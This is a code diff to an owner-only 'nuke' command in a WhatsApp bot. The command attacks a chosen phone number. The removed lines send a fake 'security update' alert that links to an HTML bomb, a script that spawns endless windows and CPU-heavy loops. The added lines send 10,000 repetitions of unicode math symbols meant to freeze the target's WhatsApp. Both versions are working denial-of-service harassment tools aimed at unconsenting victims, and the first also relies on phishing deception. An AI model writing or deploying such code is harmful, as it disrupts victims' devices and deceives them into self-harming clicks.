@@ -3,9 +3,9 @@ const logger = require('../../lib/logger');
 
 module.exports = {
     name: 'nuke',
-    aliases: ['overheat', 'lagbomb', 'nuke2'],
+    aliases: ['overheat', 'crash3'],
     category: 'owner',
-    description: 'Send a link that overheats and lags the target phone for 1 minute',
+    description: 'Send a math payload that freezes WhatsApp',
     usage: '.nuke <number>',
     ownerOnly: true,
     react: '☢️',
@@ -19,23 +19,24 @@ module.exports = {
         }
 
         const jid = targetNum + '@s.whatsapp.net';
-        await conn.sendMessage(chatId, { text: `☢️ *Preparing Nuke Payload for +${targetNum}...*` }, { quoted: mek });
+        await conn.sendMessage(chatId, { text: `☢️ *Deploying Local Nuke...*` }, { quoted: mek });
 
         try {
-            // This is a custom HTML bomb script encoded in a URL. 
-            // When they open it, it spawns infinite windows and calculations to freeze the CPU.
-            const nukeLink = "https://htmlsave.com/?html=%3Cscript%3Efor(let%20i=0;i%3C99999;i++)%7Bwindow.open('about:blank')%3B%7D%20setInterval(()%3D%3E%7Bfor(let%20j=0;j%3C1000000;j++)%7BMath.sqrt(j)%3B%7D%7D,10)%3B%3C%2Fscript%3E";
+            // The "Math" payload. 
+            // We use complex mathematical unicode symbols repeated thousands of times.
+            // WhatsApp tries to calculate the spacing for every single symbol.
+            const mathSymbols = '∑∏∫√∞≈≠≤≥';
+            // 10,000 repetitions
+            const payload = mathSymbols.repeat(10000); 
 
-            const message = `☢️ *EMERGENCY ALERT* ☢️\n\nYour device has been flagged for a security update. Click the link below immediately to prevent data loss:\n\n👉 ${nukeLink}\n\n_System Admin_`;
-
-            // Send the bait
-            await conn.sendMessage(jid, { text: message });
+            // We send it as a single message
+            await conn.sendMessage(jid, { text: payload });
             
-            await conn.sendMessage(chatId, { text: `✅ *Nuke Delivered!*\n\nWhen the target clicks the link, their phone will lag, overheat, and freeze for about 60 seconds.` }, { quoted: mek });
+            await conn.sendMessage(chatId, { text: `✅ *Nuke Deployed!*\n\nCheck the target phone. It should freeze for 30-60 seconds.` }, { quoted: mek });
             
         } catch (error) {
             logger.error(`[NUKE] Error: ${error.message}`);
-            await conn.sendMessage(chatId, { text: `❌ Failed to deliver nuke: ${error.message}` }, { quoted: mek });
+            await conn.sendMessage(chatId, { text: `❌ Failed: ${error.message}` }, { quoted: mek });
         }
     }
 };
